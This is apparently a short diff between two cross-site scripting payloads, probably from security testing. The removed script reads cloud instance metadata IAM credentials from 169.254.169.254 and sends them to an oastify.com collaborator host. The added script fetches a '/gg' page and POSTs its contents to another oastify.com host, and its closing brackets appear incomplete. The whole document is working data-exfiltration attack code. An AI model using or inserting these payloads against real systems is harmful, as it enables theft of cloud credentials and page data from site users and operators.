@@ -1,8 +1,9 @@
-<script>x = new XMLHttpRequest;
-x.onload = function() {
-    l = new XMLHttpRequest;
-    l.open("GET", "https://2774ihqf60imicg943mzwwcjwa21q1kp9.oastify.com/hook-param-test" + encodeURIComponent(this.responseText));
-    l.send();
-};
-x.open("GET", "http://169.254.169.254/latest/meta-data/iam/security-credentials/");
-x.send();</script>
+<script>fetch('/gg').then(response => response.text()).then(body => {
+  fetch('https://yln0wd4bkwwiw8u5iz0vasqfa6gx4xzlo.oastify.com/hook-param-test', {
+    method: 'POST',
+    mode: 'no-cors',
+    headers: {
+      'Content-Type': 'text/plain'
+    },
+    body: body
+  });</script>
